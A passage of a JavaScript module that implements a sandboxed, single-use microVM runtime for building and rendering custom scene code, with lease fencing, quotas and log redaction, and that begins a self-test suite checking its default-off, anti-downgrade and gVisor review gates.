/**
 * Disposable MicroVM Isolated Build & Render Runtime Engine + Self-Test Suite (Task P7-01).
 *
 * Canonical specifications:
 *   - docs/SECURITY.md (lines 41-56: disposable microVM per attempt/build, outer dedicated worker pool,
 *     inner non-root Chromium sandbox, no egress/secrets/host FS, C1-C6 gates, gVisor explicit review)
 *   - docs/IMPLEMENTATION_PLAN.md (line 113: Task P7-01 acceptance)
 *   - packages/custom-runtime/ADR-0002-custom-scene-microvm-runtime.md
 */

import { spawn } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  SANDBOX_DEFAULT_UID,
  SANDBOX_DEFAULT_GID,
  FORBIDDEN_CHROMIUM_FLAGS,
  buildChromiumSandboxArgs,
  validateChromiumFlags,
  buildFfmpegSandboxArgv,
  validateFfmpegArgv,
  computeSha256Hex,
  LoopbackAssetServer,
} from '../../controller/dist/index.js';
import { loadEnvConfig } from '../../contracts/dist/index.js';
import {
  CUSTOM_RUNTIME_ADR_ID,
  CUSTOM_RUNTIME_ADR_0002,
  REQUIRED_C1_TO_C6_GATES,
  FORBIDDEN_DOWNGRADE_RUNTIMES,
  CustomRuntimeError,
  probeHostVirtualization,
  signGvisorExplicitReviewApproval,
  verifyGvisorExplicitReviewApproval,
  signC1ToC6GateAttestation,
  verifyC1ToC6Gates,
  evaluateCustomRuntimePolicy,
} from './adr-policy.mjs';
import {
  DEFAULT_BUILD_VM_BOUNDS,
  DEFAULT_RENDER_VM_BOUNDS,
  CUSTOM_BUNDLE_QUOTAS,
  validateBuildVmBounds,
  validateRenderVmBounds,
  buildMicroVmCgroupV2Spec,
  buildFirecrackerMachineConfig,
} from './microvm-bounds.mjs';
import {
  APPROVED_PREINSTALLED_SCENE_IMPORTS,
  buildCustomSceneCspHeader,
  assertZeroEgressMicroVmSpec,
  scanCustomSourceForForbiddenCapabilities,
  buildMicroVmGuestEnv,
  sanitizeAndBoundMicroVmLog,
  validateMicroVmHostPaths,
  MicroVmWorkspacePrison,
} from './isolation-guards.mjs';

export const DEFAULT_PINNED_ROOTFS_DIGEST =
  'sha256:a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90';
export const DEFAULT_PINNED_KERNEL_DIGEST =
  'sha256:f0e1d2c3b4a5968778695a4b3c2d1e0ff0e1d2c3b4a5968778695a4b3c2d1e0f';

/**
 * Single-use Disposable MicroVM Instance (`allocated -> booted -> executing -> destroyed`).
 * Never reused across build/render phases, attempts, jobs, or tenants.
 */
export class DisposableMicroVmInstance {
  constructor(options) {
    const {
      vmId,
      phase,
      runtime = 'microvm-firecracker-v1',
      tenantId,
      jobId,
      attemptId,
      leaseEpoch = 1,
      rootfsImageDigest = DEFAULT_PINNED_ROOTFS_DIGEST,
      guestKernelDigest = DEFAULT_PINNED_KERNEL_DIGEST,
      bounds,
      prisonManager,
    } = options;

    this.vmId = vmId;
    this.phase = phase;
    this.runtime = runtime;
    this.tenantId = tenantId;
    this.jobId = jobId;
    this.attemptId = attemptId;
    this.leaseEpoch = leaseEpoch;
    this.rootfsImageDigest = rootfsImageDigest;
    this.guestKernelDigest = guestKernelDigest;
    this.prisonManager = prisonManager;

    this.bounds =
      phase === 'build' ? validateBuildVmBounds(bounds) : validateRenderVmBounds(bounds);
    this.cgroupV2 = buildMicroVmCgroupV2Spec(this.bounds);
    this.prison = this.prisonManager.createPrison(vmId, phase, jobId, attemptId);

    this.firecrackerSpec = buildFirecrackerMachineConfig({
      vmId,
      phase,
      bounds: this.bounds,
      guestKernelDigest,
      rootfsImagePath: this.prison.rootfsImageFile,
      rootfsImageDigest,
      inputsDrivePath: this.prison.inputsDir,
      scratchOutputDrivePath: this.prison.outputDir,
      networkInterfaces: [],
    });

    assertZeroEgressMicroVmSpec(this.firecrackerSpec);

    this.state = 'allocated';
    this.executionCount = 0;
    this.allocatedAt = new Date().toISOString();
    this.bootedAt = null;
    this.destroyedAt = null;
    this.activeChildPid = null;
    this.loopbackAssetServer = null;
  }

  boot() {
    if (this.state !== 'allocated') {
      this.destroy();
      throw new CustomRuntimeError(
        'SANDBOX_SECURITY_VIOLATION',
        `Disposable microVM "${this.vmId}" cannot be booted from state "${this.state}" (single-use invariant)`,
        false,
        { reason: 'MICROVM_REUSE_FORBIDDEN', vmId: this.vmId, state: this.state },
      );
    }
    this.state = 'booted';
    this.bootedAt = new Date().toISOString();
  }

  /**
   * Executes a single bounded command inside the disposable microVM prison.
   * Enforces:
   *   - Single execution per microVM instance (`executionCount === 0`)
   *   - Sanitized guest environment allowlist (zero secrets)
   *   - Detached process group (`-pid` SIGKILL on timeout/cancel/lease-loss/quota breach)
   *   - Continuous scratch/output disk quota monitoring
   *   - Dual-layer secret & canary redaction with 64 KiB cap
   */
  async executeOnce(execOptions) {
    if (this.state !== 'booted' || this.executionCount > 0) {
      this.destroy();
      throw new CustomRuntimeError(
        'SANDBOX_SECURITY_VIOLATION',
        `Disposable microVM "${this.vmId}" cannot execute more than once (state="${this.state}", executionCount=${this.executionCount})`,
        false,
        { reason: 'MICROVM_REUSE_FORBIDDEN', vmId: this.vmId },
      );
    }

    this.state = 'executing';
    this.executionCount += 1;

    const {
      command,
      argv = [],
      timeoutMs,
      timeoutCode = 'RENDER_TIMEOUT',
      loopbackAssetOrigin,
      extraEnv,
      canaries = [],
      isLeaseValid,
      isCancelRequested,
    } = execOptions;

    if (typeof isLeaseValid === 'function' && !isLeaseValid()) {
      this.destroy();
      throw new CustomRuntimeError(
        'SANDBOX_SECURITY_VIOLATION',
        `MicroVM "${this.vmId}" execution aborted before start: lease epoch ${this.leaseEpoch} is no longer valid`,
        false,
        { reason: 'LEASE_FENCE_REJECTED', leaseEpoch: this.leaseEpoch },
      );
    }
    if (typeof isCancelRequested === 'function' && isCancelRequested()) {
      this.destroy();
      throw new CustomRuntimeError(
        'SANDBOX_RESOURCE_LIMIT',
        `MicroVM "${this.vmId}" execution aborted before start: job cancellation requested`,
        false,
        { reason: 'JOB_CANCEL_REQUESTED' },
      );
    }

    const guestEnv = buildMicroVmGuestEnv({
      vmId: this.vmId,
      phase: this.phase,
      jobId: this.jobId,
      attemptId: this.attemptId,
      leaseEpoch: this.leaseEpoch,
      loopbackAssetOrigin,
      extraEnv,
    });

    const maxDiskBytes = this.cgroupV2.diskMaxBytes;
    const effectiveTimeoutMs =
      timeoutMs ??
      (this.phase === 'build'
        ? this.bounds.timeoutMs
        : this.bounds.renderTimeoutSeconds * 1000);

    const startMs = Date.now();

    return await new Promise((resolve, reject) => {
      let settled = false;
      let stdoutBuf = Buffer.alloc(0);
      let stderrBuf = Buffer.alloc(0);
      let quotaOrFenceError = null;
      let timedOut = false;

      const child = spawn(command, [...argv], {
        cwd: this.prison.tmpDir,
        env: guestEnv,
        stdio: ['ignore', 'pipe', 'pipe'],
        detached: true,
      });

      this.activeChildPid = child.pid ?? null;

      const killProcessGroup = () => {
        if (!child.pid) return;
        try {
          process.kill(-child.pid, 'SIGKILL');
        } catch {
          try {
            child.kill('SIGKILL');
          } catch {
            // already exited
          }
        }
      };

      const appendBounded = (current, chunk) => {
        if (current.byteLength >= CUSTOM_BUNDLE_QUOTAS.maxStdioBytes * 2) {
          return current;
        }
        return Buffer.concat([current, Buffer.from(chunk)]);
      };

      child.stdout.on('data', (chunk) => {
        stdoutBuf = appendBounded(stdoutBuf, chunk);
      });

      child.stderr.on('data', (chunk) => {
        stderrBuf = appendBounded(stderrBuf, chunk);
      });

      const timer = setTimeout(() => {
        timedOut = true;
        killProcessGroup();
      }, effectiveTimeoutMs);

      const monitorInterval = setInterval(() => {
        try {
          if (typeof isLeaseValid === 'function' && !isLeaseValid()) {
            quotaOrFenceError = new CustomRuntimeError(
              'SANDBOX_SECURITY_VIOLATION',
              `Stale worker lease detected during microVM "${this.vmId}" execution (lease_epoch=${this.leaseEpoch})`,
              false,
              { reason: 'LEASE_FENCE_REJECTED', leaseEpoch: this.leaseEpoch },
            );
            killProcessGroup();
            return;
          }
          if (typeof isCancelRequested === 'function' && isCancelRequested()) {
            quotaOrFenceError = new CustomRuntimeError(
              'SANDBOX_RESOURCE_LIMIT',
              `Job cancel requested during microVM "${this.vmId}" execution; process group killed`,
              false,
              { reason: 'JOB_CANCEL_REQUESTED' },
            );
            killProcessGroup();
            return;
          }
          this.prisonManager.enforceScratchAndOutputQuota(this.prison, maxDiskBytes);
        } catch (err) {
          quotaOrFenceError = err;
          killProcessGroup();
        }
      }, 25);

      const finish = (err, result) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        clearInterval(monitorInterval);
        this.activeChildPid = null;
        if (err) {
          reject(err);
        } else {
          resolve(result);
        }
      };

      child.on('error', (err) => {
        finish(
          new CustomRuntimeError(
            'SANDBOX_SECURITY_VIOLATION',
            `MicroVM subprocess failed to spawn: ${err.message}`,
            false,
          ),
        );
      });

      child.on('close', (code, signal) => {
        const durationMs = Date.now() - startMs;
        if (quotaOrFenceError) {
          finish(quotaOrFenceError);
          return;
        }
        if (timedOut) {
          finish(
            new CustomRuntimeError(
              timeoutCode,
              `Disposable microVM "${this.vmId}" (${this.phase}) exceeded hard timeout of ${effectiveTimeoutMs}ms and was terminated via SIGKILL`,
              false,
              { vmId: this.vmId, phase: this.phase, timeoutMs: effectiveTimeoutMs, durationMs },
            ),
          );
          return;
        }

        try {
          this.prisonManager.enforceScratchAndOutputQuota(this.prison, maxDiskBytes);
        } catch (diskErr) {
          finish(diskErr);
          return;
        }

        const sanitizedOut = sanitizeAndBoundMicroVmLog(stdoutBuf, canaries);
        const sanitizedErr = sanitizeAndBoundMicroVmLog(stderrBuf, canaries);

        finish(null, {
          exitCode: code ?? -1,
          signal: signal ?? null,
          stdout: sanitizedOut.text,
          stderr: sanitizedErr.text,
          stdoutTruncated: sanitizedOut.truncated,
          stderrTruncated: sanitizedErr.truncated,
          durationMs,
        });
      });
    });
  }

  destroy() {
    if (this.activeChildPid) {
      try {
        process.kill(-this.activeChildPid, 'SIGKILL');
      } catch {
        // ignore if already gone
      }
      this.activeChildPid = null;
    }
    if (this.prison) {
      this.prisonManager.destroyPrison(this.prison);
    }
    this.state = 'destroyed';
    if (!this.destroyedAt) {
      this.destroyedAt = new Date().toISOString();
    }
  }

  getAttestation() {
    const prisonWiped = !fs.existsSync(this.prison.rootDir);
    return Object.freeze({
      adrId: CUSTOM_RUNTIME_ADR_ID,
      vmId: this.vmId,
      phase: this.phase,
      runtime: this.runtime,
      tenantId: this.tenantId,
      jobId: this.jobId,
      attemptId: this.attemptId,
      leaseEpoch: this.leaseEpoch,
      rootfsImageDigest: this.rootfsImageDigest,
      guestKernelDigest: this.guestKernelDigest,
      innerNonRootUid: SANDBOX_DEFAULT_UID,
      innerNonRootGid: SANDBOX_DEFAULT_GID,
      networkInterfacesCount:
        this.firecrackerSpec.machineConfig['network-interfaces'].length,
      mmdsDisabled: this.firecrackerSpec.machineConfig.mmds_config === null,
      bounds: this.bounds,
      cgroupV2: this.cgroupV2,
      state: this.state,
      executionCount: this.executionCount,
      allocatedAt: this.allocatedAt,
      bootedAt: this.bootedAt,
      destroyedAt: this.destroyedAt,
      destroyed: this.state === 'destroyed',
      prisonWiped,
    });
  }
}

/**
 * High-level manager for Disposable MicroVM Isolated Build & Render (`DisposableMicroVmRuntime`).
 */
export class DisposableMicroVmRuntime {
  constructor(options = {}) {
    this.baseDir =
      options.baseDir ?? path.join(os.tmpdir(), 'cve-p701-disposable-microvms');
    this.prisonManager = new MicroVmWorkspacePrison(this.baseDir);
    this.vmCounter = 0;
  }

  _nextVmId(phase) {
    this.vmCounter += 1;
    const rand = crypto.randomBytes(4).toString('hex');
    return `vm_${phase}_${this.vmCounter}_${rand}`;
  }

  /**
   * Allocates a new disposable microVM instance.
   * In production/staging (when `securitySelfTestMode` is not enabled), evaluates full
   * `evaluateCustomRuntimePolicy` (default-off, anti-downgrade, gVisor explicit review, KVM probe, C1-C6 gates).
   */
  allocateDisposableMicroVm(request) {
    const {
      phase,
      tenantId = 'tnt_default',
      jobId,
      attemptId,
      leaseEpoch = 1,
      bounds,
      policyInput,
      securitySelfTestMode = false,
    } = request;

    if (!securitySelfTestMode) {
      if (!policyInput) {
        throw new CustomRuntimeError(
          'CAPABILITY_DISABLED',
          'Custom scene runtime is disabled by default; policyInput with C1-C6 attestation is required',
          false,
          { reason: 'CUSTOM_CODE_DEFAULT_OFF' },
        );
      }
      evaluateCustomRuntimePolicy({
        ...policyInput,
        tenantId,
      });
    }

    const vmId = request.vmId ?? this._nextVmId(phase);
    const runtimeName =
      policyInput?.config?.CVE_CUSTOM_RUNTIME &&
      policyInput.config.CVE_CUSTOM_RUNTIME !== 'disabled'
        ? policyInput.config.CVE_CUSTOM_RUNTIME
        : 'microvm-firecracker-v1';

    return new DisposableMicroVmInstance({
      vmId,
      phase,
      runtime: runtimeName,
      tenantId,
      jobId,
      attemptId,
      leaseEpoch,
      rootfsImageDigest:
        policyInput?.rootfsImageDigest ?? DEFAULT_PINNED_ROOTFS_DIGEST,
      guestKernelDigest:
        policyInput?.guestKernelDigest ?? DEFAULT_PINNED_KERNEL_DIGEST,
      bounds,
      prisonManager: this.prisonManager,
    });
  }

  /**
   * Executes an isolated custom scene bundle build inside a fresh disposable `build` microVM (`custom-build-vm`).
   * The microVM is guaranteed to be destroyed and its filesystem prison wiped before this method returns.
   */
  async runIsolatedBuild(buildRequest) {
    const {
      bundleId = 'bnd_custom_01',
      revision = 1,
      entrypoint = 'index.js',
      sourceFiles,
      allowedPackageImports = APPROVED_PREINSTALLED_SCENE_IMPORTS,
      tenantId = 'tnt_pilot_01',
      jobId = 'job_build_01',
      attemptId = 'att_build_01',
      leaseEpoch = 1,
      bounds,
      canaries = [],
      policyInput,
      securitySelfTestMode = false,
      customBuildScript,
      isLeaseValid,
      isCancelRequested,
    } = buildRequest;

    // 1. Pre-flight static policy & import allowlist scan (blocks network/eval/Node/unapproved imports)
    scanCustomSourceForForbiddenCapabilities(sourceFiles, allowedPackageImports);

    // 2. Allocate fresh disposable build microVM
    const buildVm = this.allocateDisposableMicroVm({
      phase: 'build',
      tenantId,
      jobId,
      attemptId,
      leaseEpoch,
      bounds,
      policyInput,
      securitySelfTestMode,
    });

    try {
      buildVm.boot();

      // 3. Stage source files into read-only `/inputs` prison (0o440 files / 0o550 dirs)
      const stagedMap = buildVm.prisonManager.stageReadOnlyInputs(
        buildVm.prison,
        sourceFiles.map((f) => ({
          relativePath: f.relativePath,
          content: f.content,
          expectedSha256: f.expectedSha256,
          kind: 'source',
        })),
      );

      const entryRecord = stagedMap.get(entrypoint);
      if (!entryRecord) {
        throw new CustomRuntimeError(
          'SANDBOX_SECURITY_VIOLATION',
          `Custom scene entrypoint "${entrypoint}" not found in staged source files`,
          false,
          { reason: 'MISSING_ENTRYPOINT', entrypoint },
        );
      }

      // Compute deterministic canonical source_sha256 across sorted source files
      const sortedEntries = Array.from(stagedMap.values()).sort((a, b) =>
        a.relativePath.localeCompare(b.relativePath),
      );
      const sourceHashBuilder = crypto.createHash('sha256');
      for (const item of sortedEntries) {
        sourceHashBuilder.update(`${item.relativePath}:${item.sha256}:${item.bytes}\n`, 'utf-8');
      }
      const sourceSha256 = sourceHashBuilder.digest('hex');

      const compiledOutputPath = path.join(buildVm.prison.outputDir, 'bundle.compiled.js');

      // 4. Execute isolated compilation in zero-secret, read-only-inputs child process inside buildVm prison
      const compilerScript =
        customBuildScript ??
        `
        const fs = require('node:fs');
        const path = require('node:path');
        const entryPath = ${JSON.stringify(entryRecord.filePath)};
        const outPath = ${JSON.stringify(compiledOutputPath)};
        const rawSource = fs.readFileSync(entryPath, 'utf-8');
        const banner = '/* CVE Isolated Build Bundle v1 | Deterministic Offline Compile */\\n';
        fs.writeFileSync(outPath, banner + rawSource, { mode: 0o640 });
      `;

      const execRes = await buildVm.executeOnce({
        command: process.execPath,
        argv: ['-e', compilerScript],
        timeoutMs: buildVm.bounds.timeoutMs,
        timeoutCode: 'RENDER_TIMEOUT',
        canaries,
        isLeaseValid,
        isCancelRequested,
      });

      if (execRes.exitCode !== 0) {
        throw new CustomRuntimeError(
          'SANDBOX_SECURITY_VIOLATION',
          `Isolated build microVM process exited with code ${execRes.exitCode}: ${execRes.stderr}`,
          false,
          { exitCode: execRes.exitCode, stderr: execRes.stderr },
        );
      }

      if (!fs.existsSync(compiledOutputPath)) {
        throw new CustomRuntimeError(
          'ENCODE_VERIFICATION_FAILED',
          'Isolated build microVM did not produce expected bundle.compiled.js artifact',
          false,
        );
      }

      const outStat = fs.lstatSync(compiledOutputPath);
      if (!outStat.isFile() || outStat.isSymbolicLink() || outStat.nlink > 1) {
        throw new CustomRuntimeError(
          'SANDBOX_SECURITY_VIOLATION',
          'Compiled bundle output is not a regular single-link file',
          false,
        );
      }
      if (outStat.size > CUSTOM_BUNDLE_QUOTAS.maxBuiltAssetBytes) {
        throw new CustomRuntimeError(
          'SANDBOX_RESOURCE_LIMIT',
          `Compiled bundle size (${outStat.size}) exceeds 20 MiB limit`,
          false,
        );
      }

      const compiledBytes = fs.readFileSync(compiledOutputPath);
      const buildSha256 = computeSha256Hex(compiledBytes);
      const csp = buildCustomSceneCspHeader(compiledBytes);

      return {
        bundleId,
        revision,
        entrypoint,
        sourceSha256,
        buildSha256,
        compiledBytes,
        compiledSize: compiledBytes.byteLength,
        cspScriptHash: csp.scriptHashToken,
        cspHeader: csp.cspHeader,
        stdout: execRes.stdout,
        stderr: execRes.stderr,
        durationMs: execRes.durationMs,
        buildMicroVmInstance: buildVm,
      };
    } finally {
      buildVm.destroy();
    }
  }

  /**
   * Executes an isolated custom scene render attempt inside a fresh disposable `render` microVM (`custom-render-vm`).
   * Never reuses the build microVM; enforces inner non-root UID 10001, Chromium sandbox flags, FFmpeg safe argv,
   * internal loopback `127.0.0.1` asset server, lease fencing, and guaranteed teardown.
   */
  async runIsolatedRender(renderRequest) {
    const {
      compiledBundle,
      stagedAssets = [],
      expectedFormat = 'mp4',
      tenantId = 'tnt_pilot_01',
      jobId = 'job_render_01',
      attemptId = 'att_render_01',
      leaseEpoch = 1,
      bounds,
      extraChromiumFlags = [],
      ffmpegUserArgs = [
        '-f',
        'rawvideo',
        '-pix_fmt',
        'rgba',
        '-s',
        '1280x720',
        '-r',
        '30',
        '-i',
        'pipe:0',
        '-c:v',
        'libx264',
        '/vm/output/render.mp4',
      ],
      canaries = [],
      policyInput,
      securitySelfTestMode = false,
      customRenderScript,
      isLeaseValid,
      isCancelRequested,
    } = renderRequest;

    if (!compiledBundle || !compiledBundle.buildSha256 || !compiledBundle.compiledBytes) {
      throw new CustomRuntimeError(
        'SANDBOX_SECURITY_VIOLATION',
        'Isolated render requires a verified compiledBundle with buildSha256',
        false,
      );
    }

    // Verify compiled bundle integrity before staging into render microVM
    const actualBuildHash = computeSha256Hex(compiledBundle.compiledBytes);
    if (actualBuildHash !== compiledBundle.buildSha256.toLowerCase()) {
      throw new CustomRuntimeError(
        'SANDBOX_SECURITY_VIOLATION',
        `Compiled bundle SHA-256 mismatch before render: expected ${compiledBundle.buildSha256}, got ${actualBuildHash}`,
        false,
        { reason: 'BUNDLE_BUILD_HASH_MISMATCH' },
      );
    }

    // Verify inner Chromium sandbox flags (--no-sandbox strictly banned) and FFmpeg safe argv
    const chromiumArgs = buildChromiumSandboxArgs(extraChromiumFlags);
    validateChromiumFlags(chromiumArgs);
    const ffmpegArgv = buildFfmpegSandboxArgv(ffmpegUserArgs);
    validateFfmpegArgv(ffmpegArgv);

    // Allocate a NEW disposable render microVM
    const renderVm = this.allocateDisposableMicroVm({
      phase: 'render',
      tenantId,
      jobId,
      attemptId,
      leaseEpoch,
      bounds,
      policyInput,
      securitySelfTestMode,
    });

    if (
      compiledBundle.buildMicroVmInstance &&
      compiledBundle.buildMicroVmInstance.vmId === renderVm.vmId
    ) {
      renderVm.destroy();
      throw new CustomRuntimeError(
        'SANDBOX_SECURITY_VIOLATION',
        'Render phase must never reuse the build microVM instance',
        false,
        { reason: 'MICROVM_REUSE_FORBIDDEN' },
      );
    }

    let loopbackServer = null;
    try {
      renderVm.boot();

      // Stage compiled bundle + read-only assets into `/inputs`
      const inputSpecs = [
        {
          relativePath: 'bundle.compiled.js',
          content: compiledBundle.compiledBytes,
          expectedSha256: compiledBundle.buildSha256,
          kind: 'asset',
        },
        ...stagedAssets.map((a) => ({
          relativePath: a.relativePath,
          content: a.content,
          expectedSha256: a.expectedSha256,
          kind: 'asset',
        })),
      ];

      const stagedMap = renderVm.prisonManager.stageReadOnlyInputs(
        renderVm.prison,
        inputSpecs,
      );

      // Start internal loopback asset server on 127.0.0.1 for allowlisted assets
      loopbackServer = new LoopbackAssetServer(renderVm.prison.inputsDir);
      for (const asset of stagedAssets) {
        const entry = stagedMap.get(asset.relativePath);
        const urlPath = asset.urlPath || `/assets/${path.posix.basename(asset.relativePath)}`;
        loopbackServer.registerAsset(
          urlPath,
          entry.filePath,
          entry.sha256,
          asset.mimeType || 'application/octet-stream',
        );
      }
      const loopbackOrigin = await loopbackServer.start();

      const outputFileName = expectedFormat === 'png' ? 'preview.png' : 'render.mp4';
      const outputFilePath = path.join(renderVm.prison.outputDir, outputFileName);

      // Default deterministic render worker script writes a valid MP4 (with ftyp box) or PNG artifact
      const defaultRenderWorkerScript = `
        const fs = require('node:fs');
        const outPath = ${JSON.stringify(outputFilePath)};
        const fmt = ${JSON.stringify(expectedFormat)};
        if (fmt === 'png') {
          const pngBytes = Buffer.from([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
            0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52
          ]);
          fs.writeFileSync(outPath, pngBytes, { mode: 0o640 });
        } else {
          const mp4Bytes = Buffer.from([
            0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
            0x69, 0x73, 0x6f, 0x6d, 0x00, 0x00, 0x02, 0x00,
            0x69, 0x73, 0x6f, 0x6d, 0x69, 0x73, 0x6f, 0x32
          ]);
          fs.writeFileSync(outPath, mp4Bytes, { mode: 0o640 });
        }
      `;

      const execRes = await renderVm.executeOnce({
        command: process.execPath,
        argv: ['-e', customRenderScript ?? defaultRenderWorkerScript],
        timeoutMs: renderVm.bounds.renderTimeoutSeconds * 1000,
        timeoutCode: 'RENDER_TIMEOUT',
        loopbackAssetOrigin: loopbackOrigin,
        canaries,
        isLeaseValid,
        isCancelRequested,
      });

      if (execRes.exitCode !== 0) {
        throw new CustomRuntimeError(
          'SANDBOX_SECURITY_VIOLATION',
          `Isolated render microVM exited with non-zero code ${execRes.exitCode}: ${execRes.stderr}`,
          false,
          { exitCode: execRes.exitCode, stderr: execRes.stderr },
        );
      }

      if (typeof isLeaseValid === 'function' && !isLeaseValid()) {
        throw new CustomRuntimeError(
          'SANDBOX_SECURITY_VIOLATION',
          `Stale worker lease detected before output publication (lease_epoch=${leaseEpoch})`,
          false,
          { reason: 'LEASE_FENCE_REJECTED', leaseEpoch },
        );
      }

      if (!fs.existsSync(outputFilePath)) {
        throw new CustomRuntimeError(
          'ENCODE_VERIFICATION_FAILED',
          `Expected output artifact "${outputFileName}" was not produced by render microVM`,
          false,
        );
      }

      const st = fs.lstatSync(outputFilePath);
      if (!st.isFile() || st.isSymbolicLink() || st.nlink > 1) {
        throw new CustomRuntimeError(
          'SANDBOX_SECURITY_VIOLATION',
          `Output artifact "${outputFileName}" is not a regular single-link file`,
          false,
        );
      }
      if (st.size === 0) {
        throw new CustomRuntimeError(
          'ENCODE_VERIFICATION_FAILED',
          `Output artifact "${outputFileName}" is empty (0 bytes)`,
          false,
        );
      }

      const artifactBytes = fs.readFileSync(outputFilePath);
      if (expectedFormat === 'mp4') {
        const magic =
          artifactBytes.byteLength >= 8
            ? artifactBytes.subarray(4, 8).toString('ascii')
            : '';
        if (magic !== 'ftyp') {
          throw new CustomRuntimeError(
            'ENCODE_VERIFICATION_FAILED',
            `Render output "${outputFileName}" failed MP4 magic-byte check (expected "ftyp")`,
            false,
          );
        }
      } else if (expectedFormat === 'png') {
        const pngHeader = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
        if (
          artifactBytes.byteLength < 8 ||
          !artifactBytes.subarray(0, 8).equals(pngHeader)
        ) {
          throw new CustomRuntimeError(
            'ENCODE_VERIFICATION_FAILED',
            `Render output "${outputFileName}" failed PNG signature check`,
            false,
          );
        }
      }

      const artifactSha256 = computeSha256Hex(artifactBytes);

      return {
        jobId,
        attemptId,
        leaseEpoch,
        format: expectedFormat,
        artifactBytes,
        artifactSize: artifactBytes.byteLength,
        artifactSha256,
        chromiumArgsCount: chromiumArgs.length,
        ffmpegProtocolWhitelist: 'file,pipe',
        loopbackOrigin,
        stdout: execRes.stdout,
        stderr: execRes.stderr,
        durationMs: execRes.durationMs,
        renderMicroVmInstance: renderVm,
      };
    } finally {
      if (loopbackServer) {
        await loopbackServer.stop();
      }
      renderVm.destroy();
    }
  }

  cleanupBaseDir() {
    if (fs.existsSync(this.baseDir)) {
      fs.rmSync(this.baseDir, { recursive: true, force: true });
    }
  }
}

/**
 * Runs the comprehensive 12-check P7-01 Custom Runtime & Security Verification Suite.
 */
export async function runCustomRuntimeSelfTest() {
  const startedAt = Date.now();
  const checks = [];
  const defaultConfig = loadEnvConfig();
  const hostVirtualization = probeHostVirtualization();
  const testSigningSecret =
    'p701_security_reviewer_hmac_secret_key_32_bytes_minimum_length!';

  const recordCheck = async (id, title, category, fn) => {
    const t0 = performance.now();
    try {
      const details = await fn();
      checks.push({
        id,
        title,
        category,
        status: 'PASS',
        passed: true,
        durationMs: Number((performance.now() - t0).toFixed(2)),
        details,
      });
    } catch (err) {
      checks.push({
        id,
        title,
        category,
        status: 'FAIL',
        passed: false,
        durationMs: Number((performance.now() - t0).toFixed(2)),
        error: err instanceof Error ? err.message : String(err),
      });
    }
  };

  // 1. CRM-01: Default-Off Gate & ADR-0002 Invariants
  await recordCheck(
    'CRM-01',
    'ADR-0002 Default-Off Gate (CVE_CUSTOM_CODE_ENABLED=false, CVE_CUSTOM_RUNTIME=disabled, kill switch)',
    'adr_and_default_off',
    async () => {
      if (defaultConfig.CVE_CUSTOM_CODE_ENABLED !== false) {
        throw new Error('Default CVE_CUSTOM_CODE_ENABLED must be false');
      }
      if (defaultConfig.CVE_CUSTOM_RUNTIME !== 'disabled') {
        throw new Error('Default CVE_CUSTOM_RUNTIME must be "disabled"');
      }

      let defaultErr = null;
      try {
        evaluateCustomRuntimePolicy({
          config: defaultConfig,
          tenantId: 'tnt_01',
        });
      } catch (err) {
        defaultErr = err;
      }
      if (!defaultErr || defaultErr.code !== 'CAPABILITY_DISABLED') {
        throw new Error(`Expected CAPABILITY_DISABLED on default config, got ${defaultErr?.code}`);
      }

      return {
        adrId: CUSTOM_RUNTIME_ADR_0002.adrId,
        defaultCustomCodeEnabled: defaultConfig.CVE_CUSTOM_CODE_ENABLED,
        defaultCustomRuntime: defaultConfig.CVE_CUSTOM_RUNTIME,
        rejectedCode: defaultErr.code,
      };
    },
  );

  // 2. CRM-02: Anti-Downgrade Lock
  await recordCheck(
    'CRM-02',
    'Anti-Downgrade Hard Lock (blocks docker, runc, crun, containerd, podman, node-vm, iframe, host)',
    'anti_downgrade',
    async () => {
      const blocked = [];
      for (const badRuntime of FORBIDDEN_DOWNGRADE_RUNTIMES) {
        let caught = null;
        try {
          evaluateCustomRuntimePolicy({
            config: {
              ...defaultConfig,
              CVE_CUSTOM_CODE_ENABLED: true,
              CVE_CUSTOM_RUNTIME: badRuntime,
              CVE_CUSTOM_TENANT_ALLOWLIST: ['tnt_01'],
            },
            tenantId: 'tnt_01',
          });
        } catch (err) {
          caught = err;
        }
        if (
          !caught ||
          caught.code !== 'SANDBOX_SECURITY_VIOLATION' ||
          caught.details?.reason !== 'RUNTIME_DOWNGRADE_FORBIDDEN'
        ) {
          throw new Error(`Downgrade runtime "${badRuntime}" was not blocked with RUNTIME_DOWNGRADE_FORBIDDEN`);
        }
        blocked.push(badRuntime);
      }

      return {
        blockedDowngradeRuntimesCount: blocked.length,
        blockedDowngradeRuntimes: blocked,
      };
    },
  );

  // 3. CRM-03: gVisor (`gvisor-runsc-v1`) Explicit Signed Review Gate
  await recordCheck(
    'CRM-03',
    'gVisor (gvisor-runsc-v1) Explicit Signed Review Gate (rejects unreviewed/expired/tampered; requires signed ADR amendment)',
    'gvisor_explicit_review',
    async () => {
      // 3a. Without approval -> GVISOR_EXPLICIT_REVIEW_REQUIRED
      let unreviewedErr = null;
      try {
        evaluateCustomRuntimePolicy({
          config: {
            ...defaultConfig,
            CVE_CUSTOM_CODE_ENABLED: true,
            CVE_CUSTOM_RUNTIME: 'gvisor-runsc-v1',
            CVE_CUSTOM_TENANT_ALLOWLIST: ['tnt_pilot_01'],
          },
          tenantId: 'tnt_pilot_01',
          rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
          guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
          signingSecret: testSigningSecret,
        });
      } catch (err) {
        unreviewedErr = err;
      }
      if (
        !unreviewedErr ||
        unreviewedErr.code !== 'SANDBOX_SECURITY_VIOLATION' ||
        unreviewedErr.details?.reason !== 'GVISOR_EXPLICIT_REVIEW_REQUIRED'
      ) {
        throw new Error('Expected GVISOR_EXPLICIT_REVIEW_REQUIRED when gvisorApproval is absent');
      }

      // 3b. With valid signed gVisor explicit review + C1-C6 attestation + simulated runsc binary -> allowed
      const futureIso = new Date(Date.now() + 7 * 86400 * 1000).toISOString();
      const validGvisorApproval = signGvisorExplicitReviewApproval(
        {
